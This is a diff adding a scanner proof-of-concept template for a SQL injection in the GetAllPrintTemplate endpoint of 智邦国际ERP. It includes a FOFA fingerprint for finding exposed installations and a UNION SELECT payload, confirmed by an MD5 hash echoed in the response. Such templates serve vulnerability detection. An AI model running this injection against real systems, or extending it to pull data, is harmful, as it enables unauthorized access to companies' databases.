@@ -1,0 +1,17 @@
+id: poc-yaml-zbintel-erp-getallprinttemplate-sqli
+info:
+  name: 智邦国际ERP GetAllPrintTemplate SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 智邦国际ERP
+  fofa: icon_hash="-682445886"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /SYSN/json/pcclient/GetAllPrintTemplate.ashx?sort=12+UNION+ALL+SELECT+NULL,NULL,sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}')),NULL--
+  expression: status_code == 200 && contains(body,"\"sort\":") && contains(body,"0x"
+    + t2) && contains(content_type,"application/json")
+transport: http
